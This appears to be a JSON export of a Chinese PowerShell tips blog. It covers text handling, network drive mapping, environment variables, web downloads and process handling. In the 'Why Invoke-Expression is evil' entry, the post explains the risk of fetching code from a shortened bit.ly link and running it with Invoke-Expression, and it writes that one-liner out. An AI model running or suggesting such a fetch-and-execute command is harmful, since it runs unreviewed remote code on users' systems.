-Newest 10 &gt; $OutPath notepad.exe $OutPath 这将产生一个文本文件，内容和控制台中显示的精确一致，但不会包含任何对象的特性。 下一个例子确保输出的文本一点也不会被截断，并且输出使用 UTF8 编码——这些参数都是简易重定向所不包含的： #requires -Version 2 $OutPath = &quot;$env:temp\\report.txt&quot; Get-EventLog -LogName System -EntryType Error, Warning -Newest 10 | Format-Table -AutoSize -Wrap | Out-File -FilePath $OutPath -Width 100 notepad.exe $OutPath","link":"/2015/08/10/avoid-using-redirection/"},{"title":"PowerShell 技能连载 - 截短文本","text":"假设您希望截掉一个字符串尾部的一些文字。以下是使用字符串操作的传统方法： $text = &quot;Some text&quot; $fromRight = 3 $text.Substring(0, $text.Length - $fromRight) 一个更强大的方法是使用 -replace 操作符结合正则表达式： $text = &quot;Some text&quot; $fromRight = 3 $text -replace &quot;.{$fromRight}$&quot; 这段代码将去掉文字尾部（$）之前 $fromRight 个任意字符（”.“）。 由于正则表达式十分灵活，所以您可以重新编辑它，只截去数字，且最多只截掉 5 个数字： $text1 = &quot;Some text with digits267686783&quot; $text2 = &quot;Some text with digits3&quot; $text1 -replace &quot;\\d{0,5}$&quot; $text2 -replace &quot;\\d{0,5}$&quot; 量词“{0,5}”告诉正则表达式引擎需要 0 到 5 个数字，引擎会尽可能多地选取。","link":"/2015/08/11/shortening-text/"},{"title":"PowerShell 技能连载 - 快速获取 IP 地址","text":"您是否希望快速获取您的机器或是网络上的机器的 IP 地址列表？以下是实现方法： #requires -Version 3 $ComputerName = '' [System.Net.Dns]::GetHostAddresses($ComputerName).IPAddressToString 要只取 IPv4 地址，请使用这种方法： #requires -Version 1 $ComputerName = '' [System.Net.Dns]::GetHostAddresses($ComputerName) | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -ExpandProperty IPAddressToString 类似地，要获取 IPv6 地址，请改成这种方法： #requires -Version 1 $ComputerName = '' [System.Net.Dns]::GetHostAddresses($ComputerName) | Where-Object { $_.AddressFamily -eq 'InterNetworkV6' } | Select-Object -ExpandProperty IPAddressToString","link":"/2015/08/12/quickly-getting-ip-addresses/"},{"title":"字幕整理脚本","text":"从看过的电影、美剧里学英语是一件很棒的事。因为你曾经被带入过那个场景，曾经和主角一同喜怒哀乐。如果能将电影里的中英文对白整理出来，对做笔记和搜索回顾将大有帮助。 我们可以从网上（例如射手网）下载视频的中英文字幕，需要是 .srt 格式的。它实际上是一个文本文件，内容类似如下： 12345678910111213141516171300:04:42,050 --&gt; 00:04:45,010{\\an2}{\\pos(212,240)}第三季 第一集1400:01:56,000 --&gt; 00:01:56,990爸Hey, Pop.1500:01:56,880 --&gt; 00:02:04,020{\\an8}凯文·安德伍德1600:01:59,750 --&gt; 00:02:01,510好久不见啊Been a while, hasn't it? 我们希望将它整理成这样的格式： 123456789第三季 第一集爸Hey, Pop.凯文·安德伍德好久不见啊Been a while, hasn't it? 这个任务可以用 PowerShell + 正则表达式轻松搞定。 12345678910111213141516if (!(Test-Path dst)) { md dst | Out-Null}Get-ChildItem src\\*.srt | ForEach-Object { $srcFile = $_ Write-Output &quot;Processing $($srcFile.Name)&quot; $dstFile = (Join-Path 'dst' $srcFile.BaseName) + '.txt' Get-Content $srcFile | ForEach-Object { $line = $_ if ($line -cmatch '\\A\\d+\\z') { return } if ($line -cmatch '\\d\\d:\\d\\d:\\d\\d,\\d\\d\\d --&gt; \\d\\d:\\d\\d:\\d\\d,\\d\\d\\d') { return } $line = $line -creplace '\\s*\\{\\\\.*?\\}\\s*', '' return $line } | Out-File $dstFile} 只需要将字幕源文件放在_src_目录下，运行脚本，就可以在_dst_目录下得到期望的文本文件。执行效果如下： 文件目录如下： 您也可以在这里下载完整的脚本。","link":"/2015/08/13/Subtitle-Optimizer/"},{"title":"PowerShell 技能连载 - 删除数组元素","text":"您曾经比较过两个数组吗？Compare-Object 可能有用。请试试这段代码： $array1 = 1..100 $array2 = 2,4,80,98 Compare-Object -ReferenceObject $array1 -DifferenceObject $array2 | Select-Object -ExpandProperty InputObject 执行的结果是 $array1 的内容减去 $array2 的内容。 要获取 $array1 和 $array2 中共有的元素，请使用以下方法： $array1 = 1..100 $array2 = 2,4,80,98, 112 Compare-Object -ReferenceObject $array1 -DifferenceObject $array2 -ExcludeDifferent -IncludeEqual | Select-Object -ExpandProperty InputObject","link":"/2015/08/13/remove-array-elements/"},{"title":"PowerShell 技能连载 - 简单的 INI 文件替代","text":"如果您想将设置保存在您的脚本之外并将它们保存在一个独立的配置文件中，那么您可以使用各种数据格式。 INI 文件的并地支持并不充分，所以您得人工处理它们。JSON 和 XML 文件有处理器支持，但是文字内容太复杂，不容易被人类阅读。 If your config data can be expressed as key-value pairs like below, then we have an alternative:如果您的配置数据是类似这样的键值对，那么我们可以有别的选择： 123Name = 'Tom'ID = 12Path = 'C:' 将键值对保存为一个纯文本文件，然后使用这段代码来读取该文件： $hashtable = @{} $path = 'z:\\yourfilename.config' $payload = Get-Content -Path $path | Where-Object { $_ -like '*=*' } | ForEach-Object { $infos = $_ -split '=' $key = $infos[0].Trim() $value = $infos[1].Trim() $hashtable.$key = $value } 结果是一个哈希表，您可以用这种方式轻松地读取各项的值： $hashtable.Name $hashtable.ID $hashtable.Path","link":"/2015/08/14/simple-replacement-for-ini-files/"},{"title":"PowerShell 技能连载 - 向原始数据类型增加额外信息","text":"也许您希望对一个变量做标记并提供一些额外信息。在 PowerShell 中，可以使用 Add-Member 来向一个变量附加 NoteProperties 或 ScriptProperties。 一个 NoteProperty 包含一些静态信息，而当我们获取一个 ScriptProperty 的值时，将会运行一段代码。 请看如何对一个简单的字符串做操作： $a = &quot;some text&quot; $a = $a | Add-Member -MemberType NoteProperty -Name Origin -Value $env:computername -PassThru $a = $a | Add-Member -MemberType ScriptProperty -Name Time -Value { Get-Date } -PassThru $a $a.Origin $a.Time","link":"/2015/08/17/appending-extra-information-to-primitive-data-types/"},{"title":"PowerShell 技能连载 - 向对象增加额外信息","text":"当您获取结果信息时，您可能会希望向结果对象添加一些额外的属性，这样待会儿就可以知道它们是从哪儿来的。 向复杂类型对象添加额外的信息和向简单数据类型添加额外的信息不同（在前一个技能中有介绍）。 Get-Process | Add-Member -MemberType NoteProperty -Name PC -Value $env:COMPUTERNAME -PassThru | Select-Object -Property Name, Company, Description, PC | Out-GridView 这段代码中 Get-Process 返回的进程均被添加了一个名为“PC”的额外属性，用来存放进程所在的计算机名。 要查看自定义属性，要么使用 Select-Object 并指定属性名，要么使用点号语法： $list = Get-Process | Add-Member -MemberType NoteProperty -Name PC -Value $env:COMPUTERNAME -PassThru $list | ForEach-Object { 'Process {0} on {1}' -f $_.Name, $_.PC }","link":"/2015/08/18/adding-additional-information-to-objects/"},{"title":"PowerShell 技能连载 - 隐藏变量内容","text":"当您覆盖某个对象的 ToString() 方法时，您就可以控制这个对象的显示方式。而这个对象的内容并不会被改变： $a = 123 $a = $a | Add-Member -MemberType ScriptMethod -Name toString -Value { 'secret'} -Force -PassThru $a $a -eq 123 $a.GetType().FullName 例如，当一个变量表示字节数的时候，您甚至可以在您的自定义的 ToString() 方法中获取原始的变量值，然后将它显示为 MB（兆字节）： $a = 2316782313 $a = $a | Add-Member -MemberType ScriptMethod -Name toString -Value { [Math]::Round($this / 1MB,1) } -Force -PassThru $a $a -eq 123 $a.GetType().FullName","link":"/2015/08/19/hiding-variable-content/"},{"title":"PowerShell 技能连载 - 快速查找脚本","text":"要在“我的文档”文件夹的任意位置中快速定位一个 PowerShell 脚本，请试试这个 Find-Script 函数： #requires -Version 3 function Find-Script { param ( [Parameter(Mandatory = $true)] $SearchPhrase, $Path = [Environment]::GetFolderPath('MyDocuments') ) Get-ChildItem -Path $Path -Filter *.ps1 -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern $SearchPhrase -List | Select-Object -Property Path, Line | Out-GridView -Title &quot;All Scripts containing $SearchPhrase&quot; -PassThru | ForEach-Object -Process { ise $_.Path } } 像这样运行： Find-Script 'childitem' 这将返回一个在您的文档文件夹中包含搜索关键词的所有 PowerShell 脚本。当您在网格视图窗口中选择了某些脚本并点击确认按钮后，这些脚本将会自动由 PowerShell ISE 打开。 要设置一个不同的搜索跟路径，请使用 -Path 参数。通过这种方式，您可以很容易地在您的 USB 媒体或是网络路径中搜索。","link":"/2015/08/20/quickly-finding-scripts/"},{"title":"PowerShell 技能连载 - 快速设置多个环境变量","text":"以下是一种快速（并且永久地）设置一系列环境变量的很棒的方法： $hashtable = @{ Name = 'Weltner' ID = 12 Ort = 'Hannover' Type = 'Notebook' ABC = 123 } $hashtable.Keys | ForEach-Object { $Name = $_ $Value = $hashtable.$Name [Environment]::SetEnvironmentVariable($Name, $Value, &quot;User&quot;) } 只需要在一个哈希表中定义变量。该脚本将为每个键值对创建一个环境变量。将“User”替换为“Machine”，就可以创建系统级别的环境变量。不过这将需要管理员权限。 通过类似的方法，您也可以删除环境变量。只需要将空字符串赋值给哈希表中的值即可。","link":"/2015/08/21/quickly-setting-multiple-environment-variables/"},{"title":"PowerShell 技能连载 - 查找驱动器号","text":"以下是一个查找保留驱动器号的简单函数： #requires -Version 3 function Get-DriveLetter { (Get-WmiObject -Class Win32_LogicalDisk).DeviceID } 要列出所有正在使用的驱动器号，请使用以下代码： PS&gt; Get-DriveLetter C: D: Y: Z: PS&gt; 要查看某个给定的驱动器号是否被保留，可以使用这段代码： PS&gt; $letters = Get-DriveLetter PS&gt; $letters -contains 'c:' True PS&gt; $letters -contains 'f:' False PS&gt;","link":"/2015/08/24/finding-drive-letters/"},{"title":"PowerShell 技能连载 - 以管理员身份执行指定的代码","text":"如果您需要以管理员身份运行指定的脚本片段，您可以以管理员身份临时创建第二个 PowerShell 实例，然后在临时的实例中执行特权代码。 这是一段停止 Windows 更新服务的例子。当您以普通用户运行这段代码时，它将自动弹出提权的对话框，然后在一个新的管理员外壳中执行您的代码： #requires -Version 2 Start-Process -FilePath powershell.exe -Verb runas -ArgumentList 'Stop-Service -Name wuauserv' -WindowStyle Minimized","link":"/2015/08/25/executing-selected-code-as-admin/"},{"title":"PowerShell 技能连载 - 指定执行超时","text":"Start-Process 可以启动进程但是不支持超时。如果您需要在指定的超时时间后结束一个跑飞了的进程，您可以使用类似这样的方法： #requires -Version 2 $maximumRuntimeSeconds = 3 $process = Start-Process -FilePath powershell.exe -ArgumentList '-Command Start-Sleep -Seconds 4' -PassThru try { $process | Wait-Process -Timeout $maximumRuntimeSeconds -ErrorAction Stop Write-Warning -Message 'Process successfully completed within timeout.' } catch { Write-Warning -Message 'Process exceeded timeout, will be killed now.' $process | Stop-Process -Force } Wait-Process 用于等待进程执行。如果它没有在指定的超时之内结束，Wait-Process 将抛出一个异常。在相应的错误处理器中可以决定要如何处理。 在这个例子中，catch 代码块将结束进程。 这个例子的处理代码是启动第二个 PowerShell 实例，在新的实例中执行 Start-Sleep 命令来模拟某些长时间运行的任务。如果您将 Start-Sleep 的参数调整为短于 $maximumRuntimeSeconds 指定的值，那么操作将会在指定的超时值之内完成，而您的脚本将不会结束该进程。","link":"/2015/08/26/executing-with-timeout/"},{"title":"PowerShell 技能连载 - 映射网络驱动器（第 1 部分）","text":"PowerShell 支持控制台命令，所以如果您需要映射一个网络驱动器，通常最可靠的方式是使用传统好用的 net.exe，类似这样： #requires -Version 1 net.exe use M: '\\\\dc-01\\somefolder' /PERSISTENT:YES Test-Path -Path M:\\ explorer.exe M:\\ 如果您忽略“/PERSISTENT:YES”参数，那么映射的驱动器将只是临时的，注销并登录后将不会自动重连。 请注意如果驱动器号 M: 已在使用中，将会收到一个错误。将 M: 换成一个星号，将自动使用下一个可用的驱动器号。 要提交登录凭据，请使用这种方法： net.exe use * '\\\\dc-01\\somefolder' /PERSISTENT:YES /USER:training\\user03 * 这将以 training\\user03 的身份登录，并使用下一个可用的驱动器号，并且交互式地询问密码。请注意这只能在普通的 PowerShell 控制台中使用。它不能在 PowerShell ISE 中使用，因为 PowerShell ISE 并没有一个真实的控制台，所以无法交互式地询问密码。 要提交密码，将用户名之后的星号替换为密码。这当然不是很好的实践，因为这将把密码透露给所有可以查看代码的人。","link":"/2015/08/27/mapping-network-drives-part-1/"},{"title":"PowerShell 技能连载 - 映射网络驱动器（第 2 部分）","text":"从 PowerShell 3.0 开始，您可以使用 New-PSDrive 命令来映射网络驱动器。它们也可以在文件管理器中显示。以下是一些示例代码： #requires -Version 3 New-PSDrive -Name N -PSProvider FileSystem -Root '\\\\dc-01\\somefolder' -Persist Test-Path -Path N:\\ explorer.exe N:\\ Get-PSDrive -Name N Remove-PSDrive -Name N -Force 如果您希望提供登录凭据，请在 New-PSDrive 命令后添加 -Credential 参数，并且以 domain\\username 的方式提交用户名。密码将会以安全的方式提示输入。","link":"/2015/08/28/mapping-network-drives-part-2/"},{"title":"PowerShell 技能连载 - 映射网络驱动器（第 3 部分）","text":"如果您从 VBScript 迁移到 PowerShell，您也许会记得 VBScript 如何映射网络驱动器。这个选项在 PowerShell 中仍然有效。 $helper = New-Object -ComObject WScript.Network $helper.MapNetworkDrive('O:','\\\\dc-01\\somefolder',$true) $helper.EnumNetworkDrives() Test-Path -Path O:\\ explorer.exe O:\\ Get-PSDrive -Name O $helper.RemoveNetworkDrive('O:', $true, $true) 如果您希望以不同的凭据登录，请使用这种方式： $helper.MapNetworkDrive('O:','\\\\dc-01\\somefolder',$true, 'training\\user02', 'topSecret')","link":"/2015/08/31/mapping-network-drives-part-3/"},{"title":"欢迎使用新版的PowerShell官网主页（转）","text":"筹划了很久，一直想搭建一个独立的PowerShell主页，来展示我们分散在其它网站上面大量的PowerShell资源。比如PowerShell脚本库，博客，Connect，GitHub仓库和TechNet文档，显然PowerShell已经在很多地方立足了。 今天我们很荣幸的宣布新版的PowerShell主页正式上线。https://msdn.microsoft.com/en-us/powershell 我们很努力地为PowerShell建立了一个新版的主页。第一个发布版本给用户提供了一个集成了官方的PowerShell资源，内容，文档的统一门户。新版的Powershell主页让我们的在线品牌体验更现代化，它有一个简单的导航栏和一个响应式的，移动端友好的界面设计。我们计划让它成长为一个PowerShell社区相关的一站式商店。 在接下来的两周中，我们会对网站的某些方面稍加润色，同时添加一些额外的内容来展示我们社区生态系统中的亮点。我们会快速迭代，将会由微软PowerShell内部团队对网站进行直接维护。如果您有任何问题，建议和反馈，请（在原文下面）随时留下评论，或着关注我的tweet(@joeyaiello) 或着 Neema Saeedi (@neems)。 荔非苔注：截至本文发稿，对应的PowerShell中文主页依然是旧版。 原文作者：Joey Aiello（PowerShell项目经理）原文链接：Welcoming the new home of PowerShell中译链接：欢迎使用新版的PowerShell官网主页 - PowerShell 中文博客","link":"/2015/09/01/welcoming-the-new-home-of-powershell/"},{"title":"Windows管理框架(WMF) 5.0 路线图（转）","text":"在接下来的几周之内（2015年8月）我们将会继续发布受支持的Windows 管理框架（WMF）5.0的后续“预览产品”，2015年第四个季度，您将能够下载到WMF5.0的RTM版本。 WMF 5.0的产品预览版和前几个版本的WMF5.0预览版相比，有如下不同: 微软会对它提供完整支持，一直到WMF RTM 50正式发布。提供完整支持意味着，将给客户遇到的任何妨碍性问题我们都会提供调查和应对方案，甚至必要的更新。 预览产品中所有功能都将会出现在最终产品中，在这个安装包中没有任何的实验性的功能。 您必须在安装这个预览版之前，卸载之前的所有预览版 不管是即将到来的完整支持版本的WMF 5.0（预览产品和正式版），我们都将会经常吸收我们WMF5.0预览版用户社区提供的反馈。所以还望您尽早部署WMF 5.0产品预览版，并且提前提供建议给我们，争取让我们的RTM版本更好。 原文作者：Hemant Mahawar [MSFT] （高级项目经理）原文链接：Windows Management Framework (WMF) 5.0 Roadmap中译链接：Windows管理框架(WMF) 5.0 路线图 - PowerShell 中文博客","link":"/2015/09/01/windows-management-framework-wmf-v5-roadmap/"},{"title":"PowerShell 技能连载 - 只用一行代码创建新对象","text":"有些时候您可能需要创建自己的对象来存储一系列信息。以下这行简洁的单行代码演示了如何快速创建新的对象： #requires -Version 3 $Info = 'Test' $SomeOtherInfo = 12 New-Object PSObject -Property ([Ordered]@{Location=$Info; Remark=$SomeOtherInfo }) 这段代码的执行后将创建包含 Location 和 Remark 两个属性的新对象。只需要重命名哈希表中的键名，即可改变对象的属性名。 Location Remark -------- ------ Test 12 请注意 [Ordered] 是 PowerShell 3.0 引入的，能够创建有序的哈希表。在 PowerShell 2.0 中，可以使用不带 [ordered] 的代码。不带它会导致新对象中的属性顺序是随机的。","link":"/2015/09/01/creating-new-objects-oneliner/"},{"title":"PowerShell 技能连载 - 列出（并检查）PowerShell 用户配置","text":"用户配置脚本指的是当 PowerShell 启动时自动执行的 PowerShell 脚本。主用户配置脚本的路径可以通过 $profile 获得。 要获得所有可能的用户配置脚本路径，可以使用以下代码： #requires -Version 1 ($profile | Get-Member -MemberType NoteProperty).Name | ForEach-Object { $profile.$_ } 要检查您机器上的所有用户配置，请使用这段示例代码： #requires -Version 3 ($profile | Get-Member -MemberType NoteProperty).Name | ForEach-Object { $path = $profile.$_ New-Object PSObject -Property ([Ordered]@{Path=$Path; Exists=(Test-Path $Path) }) } 输出结果类似如下： Path Exists ---- ------ C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1 False C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Microsoft.PowerShellISE_profile.ps1 False C:\\Users\\user09\\Documents\\WindowsPowerShell\\profile.ps1 True C:\\Users\\user09\\Documents\\WindowsPowerShell\\Microsoft.PowerShellISE_profile.ps1 True 这个例子有趣的地方是如何编程获取对象的属性。您可以使用 Get-Member 来查找某个对象的属性名。我们将在接下来的文章中介绍这个隐藏的技能。","link":"/2015/09/02/listing-and-checking-powershell-profiles/"},{"title":"PowerShell 技能连载 - 逐行显示对象的属性","text":"有些时候您可能需要查看某个对象中包含的数据。例如，如果您查询 PowerShell 的进程并将它显示在一个网格视图窗口中，您可以查看对象的内容： Get-Process -Id $pid | Out-GridView 但这样真的容易查看吗？这个对象显示在一行里，而且一个潜在的限制是网格视图窗口最多只能显示 30 列。由于所有信息都显示在一行里，您也无法搜索属性，因为总是整行被同时选中。 能否更友好地逐行显示对象属性呢？以下是实现方法： $object = Get-Process -Id $pid ($object | Get-Member -MemberType *Property).Name | ForEach-Object { New-Object PSObject -Property ([Ordered]@{Property=$_; Value=$object.$_ }) } | Out-GridView 现在，每个属性各显示在一行上，可以尽可能多地显示，而且可以根据内容搜索某个特定的属性。","link":"/2015/09/03/displaying-object-properties-one-per-line/"},{"title":"PowerShell 技能连载 - 通用属性和可选的通用属性","text":"cmdlet 和高级的 PowerShell 函数可以拥有自己的参数，但它们通常继承了通用的参数。 要查看通用参数的列表，请试试这段代码： PS&gt; [System.Management.Automation.Cmdlet]::CommonParameters Verbose Debug ErrorAction WarningAction ErrorVariable WarningVariable OutVariable OutBuffer PipelineVariable 结果视 PowerShell 的版本可能会有不同。在 PowerShell 5.0 中，增加了两个通用的参数。 有些 cmdlet 可能有额外的通用参数。要列出这些参数，请试试这段代码： PS&gt; [System.Management.Automation.Cmdlet]::OptionalCommonParameters WhatIf Confirm UseTransaction","link":"/2015/09/04/common-parameters-and-optional-common-parameters/"},{"title":"PowerShell 技能连载 - 输出的同时赋值","text":"如果您想将某个命令的结果赋给一个变量，并且同时输出结果，以下是两种实现方法： 您可以使用小括号： PS&gt; ($result = Get-Service) Status Name DisplayName ------ ---- ----------- Running AdobeARMservice Adobe Acrobat Update Service (...) 或者使用 OutVariable 通用参数： PS&gt; Get-Service -OutVariable result Status Name DisplayName ------ ---- ----------- Running AdobeARMservice Adobe Acrobat Update Service (...)","link":"/2015/09/07/outputting-and-assigning-at-the-same-time/"},{"title":"PowerShell 技能连载 - 定义缺省参数","text":"PowerShell 可以为任意参数定义缺省值，所以如果您总是需要传同一个缺省值给 Get-ChildItem 的 -Path 参数，那么可以这么做： PS&gt; $PSDefaultParameterValues['Get-ChildItem:Path'] = 'C:\\$Recycle.Bin' 当您运行 Get-ChildItem（或它的别名，例如 dir），并且没有传入 -Path 参数时，PowerShell 总是会使用 $PSDefaultParameterValues 变量中定义的值。 您也可以使用通配符。例如，如果您希望对所有 AD 命令的 -Server 参数设置缺省值，请试试这段代码： PS&gt; $PSDefaultParameterValues['*-AD*:Server'] = 'dc-01' $PSDefaultParameterValues 实际上是一个哈希表，所以您可以覆盖缺省值，或将当前定义的所有缺省值导出成列表： Name Value ---- ----- *-AD*:Server dc-01 Get-ChildItem:Path C:\\$Recycle.Bin 要清空所有缺省参数，请清除哈希表： PS&gt; $PSDefaultParameterValues.Clear()","link":"/2015/09/08/defining-default-parameters/"},{"title":"PowerShell 技能连载 - 在 PowerShell ISE 中使用 PowerShell Tabs","text":"随着 PowerShell 3.0 及以上版本发行的 PowerShell ISE 实际上是一个多宿主。它可以容纳多个单独的 PowerShell 实例。 要添加一个新的 PowerShell 宿主，请按 CTRL + T。然后输入 Enter-PSSession，并按下 CTRL + SHIFT + R 就能创建一个连接到远程系统的新的 PowerShell 宿主。 每个新的 PowerShell 宿主界面在 PowerShell ISE 中体现为一个新的标签页，名字为“PowerShell1”、“PowerShell2”、“PowerShell3”等。 在 ISE 中多个独立的 PowerShell 宿主十分有用。例如，希望在一个干净的环境里测试 test-drive 代码。 如果您愿意的话，甚至可以对标签进行重命名，来更好地体现它所表示的内容： PS&gt; $psise.CurrentPowerShellTab.DisplayName = 'Testing' 请注意只有在至少有 2 个以上 PowerShell 宿主时，才会显示 PowerShell 标签。您可能需要先按下 CTRL + T 才能够看到重命名的效果。","link":"/2015/09/09/using-powershell-tabs-in-the-powershell-ise/"},{"title":"PowerShell 技能连载 - 向 PowerShell ISE 添加测试宿主","text":"要在随 PowerShell 3.0 以上版本发行的 PowerShell ISE 中打开一个新的测试宿主，这是一个小小的辅助函数： #requires -Version 3 function New-PSHost { param ( [Parameter(Mandatory = $true)] $Name ) $newTab = $psise.PowerShellTabs.Add() $newTab.DisplayName = $Name } 当您运行该函数并且输入 New-PSHost 之后，您会收到一个输入名字的提示。请键入新的测试宿主的名字，并按下 ENTER 键，PowerShell ISE 将会在一个新的 PowerShell 标签页中打开一个新的 PowerShell 宿主，并且标签页以您起的名字命名。","link":"/2015/09/10/adding-test-hosts-to-powershell-ise/"},{"title":"PowerShell 技能连载 - 创建真实的类","text":"PowerShell 5.0 开始引入了类的概念，不过您也可以在 PowerShell 的其它版本中使用自定义类。只需要用 C# 代码来定义真正的类，然后用 Add-Type 来编译这些类。 以下是一个创建一个名为“myClass”，包含三个属性的新类。PowerShell 接下来可以用 New-Object 命令创建对象。 $code = ' using System; public class myClass { public bool Enabled { get; set; } public string Name { get; set; } public DateTime Time { get; set; } } ' Add-Type -TypeDefinition $code $instance = New-Object -TypeName myClass $instance.Enabled = $true $instance.Time = Get-Date $instance.Name = $env:username $instance 为什么需要这么做呢？自定义的类可以包含来自多个来源的信息，而且您可以使用 C# 的各种复杂特性来定义您的类，包括方法、动态和静态成员等。 显然，拥有一些技术背景的开发人员对这种技术最感兴趣。","link":"/2015/09/11/creating-real-classes/"},{"title":"PowerShell 技能连载 - 用 ProcessID 定位服务","text":"Group-Object 是一个创建查询表的很好的命令。如果您希望用进程 ID 来定位一个 Windows 服务，以下是实现方法： $serviceList = Get-WmiObject -Class Win32_Service | Group-Object -Property ProcessID -AsString -AsHashTable 一旦变量被赋值之后，只需要用进程 ID 作为属性即可： PS&gt; $serviceList.672 ExitCode : 0 Name : WSearch ProcessId : 672 StartMode : Auto State : Running Status : OK","link":"/2015/09/14/identifying-services-by-processid/"},{"title":"PowerShell 技能连载 - 分析 svchost 进程","text":"有时候，您会在任务管理器或 Get-Process 输出中看到一系列名为“svchost”的进程。每个“svchost”进程中运行着一个或多个 Windows 服务。 要更好地理解这些进程后隐藏着哪些服务，您可以使用这样的代码： #requires -Version 2 # Hash table defines two keys: # Name and Expression # they can be used with Select-Object # to produce &quot;calculated&quot; properties $Service = @{ Name = 'Service' Expression = { # if the process is &quot;svchost&quot;... if ($_.Name -eq 'svchost') { # ...find out the current process ID... $processID = $_.ID # ...and look up the services attached to it ($serviceList.$processID).Name -join ', ' } } } # create a service lookup table with ProcessID as a key $serviceList = Get-WmiObject -Class Win32_Service | Group-Object -Property ProcessID -AsString -AsHashTable # get all running processes... Get-Process | # add the new calculated column defined in $Service... Select-Object -Property Name, ID, CPU, $Service | # and output results to a grid view Window Out-GridView 当您运行这段代码时，您会见到当前运行中的进程列表。当进程名是“svchost”时，您会在新的“Service”列中查看到服务名。","link":"/2015/09/15/analyzing-svchost-processes/"},{"title":"PowerShell 技能连载 - 访问网页内容","text":"从 PowerShell 3.0 开始，Invoke-WebRequest 命令可以轻松地下载网页内容。例如这个例子可以从 www.powertheshell.com 获取所有链接： #requires -Version 3 $url = 'http://www.powertheshell.com' $page = Invoke-WebRequest -Uri $url $page.Links 您也可以用这种方式获取原始的 HTML 内容： #requires -Version 3 $url = 'http://www.powertheshell.com' $page = Invoke-WebRequest -Uri $url $page.RawContent 当您用这种方法处理其它 URL 时，您可能偶尔会遇到弹出一个安全警告框，提示需要存储 cookie 的权限。要禁止这些对话框出现并静默执行命令，请使用 -UseBasicParsing 参数。","link":"/2015/09/16/accessing-web-page-content/"},{"title":"PowerShell 技能连载 - 为什么 Invoke-Expression 是邪恶的","text":"Invoke-Expression 接受任何字符串输入并将它视为 PowerShell 代码。通过这种方式，您可以动态地创建代码，并执行它。 Invoke-Expression 是一个非常危险的命令，因为不仅您可以创建动态的代码。恶意的脚本可以隐藏它的邪恶目的，例如通过 web 站点下载代码。 以下是一个安全并有趣的例子，演示了如何从下载到执行一段代码： #requires -Version 3 Invoke-Expression -Command (Invoke-WebRequest -Uri 'http://bit.ly/e0Mw9w' -UseBasicParsing).Content 如果您不希望发生意外，这行代码可以帮您预览将会发生什么。请在 PowerShell ISE 中运行这段代码。它将显示从 internet 下载的 PowerShell 代码，而不是立即执行它： #requires -Version 3 $file = $psise.CurrentPowerShellTab.Files.Add() $file.Editor.text = (Invoke-WebRequest -Uri 'http://bit.ly/e0Mw9w' -UseBasicParsing).Content","link":"/2015/09/17/why-invoke-expression-is-evil/"},{"title":"PowerShell 技能连载 - 将哈希表用作条件化的代码库","text":"脚本中平时经常需要检测一个文件夹是否存在，如果不存在则创建： #requires -Version 1 $path = 'c:\\testfolder' $exists = Test-Path -Path $path if ($exists) { $null = New-Item -Path $path -ItemType Directory Write-Warning -Message 'Folder created' } else { Write-Warning -Message 'Folder already present' } 以下是一种很不常见的方法，以一种不同的概念实现相同的功能： #requires -Version 1 $Creator = @{ $true = { Write-Warning 'Folder already present'} $false = {$null = New-Item -Path $Path -ItemType Directory Write-Warning 'Folder created'} } $Path = 'c:\\testfolder2' &amp; $Creator[(Test-Path $Path)] 实际上，这段脚本用了一个哈希表（$Creator)）来存储两个脚本块，而它的键是 $true 和 $false。 现在，根据文件夹存在与否，哈希表将返回合适的脚本块，接下来被 &amp;（调用）操作符执行。 哈希表用这种方式来模拟从句。","link":"/2015/09/18/using-hash-table-as-conditional-code-repository/"},{"title":"PowerShell 技能连载 - 下载文件","text":"Invoke-WebRequest 可以从 internet 下载文件。这个例子将下载一个 33MB 的 NASA 公开视频到您的计算机上，然后用您计算机上 WMV 视频文件的关联应用打开它： #requires -Version 3 $Video = 'http://s3.amazonaws.com/akamai.netstorage/HD_downloads/BEAMextract_final_revB.wmv' $Destination = &quot;$env:temp\\nasavideo1.wmv&quot; Invoke-WebRequest -Uri $Video -OutFile $Destination -UseBasicParsing Invoke-Item -Path $Destination","link":"/2015/09/21/downloading-files/"},{"title":"PowerShell 技能连载 - 设置新的 Windows 注册所有者","text":"这一小段代码将提示输入新的注册所有者名，然后将更新 Windows 注册表中的值。请注意需要管理员权限。 #requires -RunAsAdministrator $NewName = Read-Host -Prompt 'Enter New Registered Windows Owner' Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name RegisteredOwner -Value $NewName -Type String 这也是一个更改 Windows 注册表的模板代码。","link":"/2015/09/22/setting-new-windows-registered-owner/"},{"title":"PowerShell 技能连载 - 修正远程发送者信息","text":"如果您使用 Invoke-Command 来远程执行 PowerShell 代码，您可能会注意到 PowerShell 远程操作会添加一个新的 PSComputerName 属性用来表示数据的来源。 这段代码将获取名为 dc-01 的机器的进程列表。PSComputerName 属性指明了源计算机名。当您使用多于一台电脑时十分有用。 #requires -Version 2 $code = { Get-Process } Invoke-Command -ScriptBlock $code -ComputerName dc-01 然而，如果您将结果用管道输出到 Out-GridView，PSComputerName 属性消失了。 作为一个变通办法，当您将结果输出到 Select-Object 命令时，PSComputerName 属性将会在网格视图窗口中正确地显示。 #requires -Version 2 $code = { Get-Process | Select-Object -Property Name, ID, Handles, CPU } Invoke-Command -ScriptBlock $code -ComputerName dc-01 | Out-GridView","link":"/2015/09/23/fixing-remoting-sender-information/"},{"title":"PowerShell 技能连载 - 移除 Windows 10 应用","text":"Windows 10 预装了一系列应用程序。幸运的是，您可以用 PowerShell 来移除您不想要的程序。当然，需要管理员权限。 要查看安装了哪些应用程序，请运行这段代码： Get-AppxPackage -User $env:USERNAME 这将列出所有用您自己的用户账户安装的应用程序。要移除应用程序，请使用 PackageFullName，并且将它传给 Remove-AppxPackage 命令。请在更改之前备份您的系统，而且风险自负。多数应用程序并不是必须的。","link":"/2015/09/24/removing-windows-10-apps/"},{"title":"PowerShell 技能连载 - 使用后台任务","text":"后台任务可以用来加速您的脚本。如果您的脚本有一系列可并发执行的独立的任务组成，那么就合适使用后台任务。 后台任务适用于这两种情况： 任务需要至少 3-4 秒执行时间。 任务并不会返回大量数据。 以下是一个基本的由 3 个任务组成的后台任务场景。如果依次执行，它们一共约耗费 23 秒时间。通过使用后台任务，它们只消耗 11 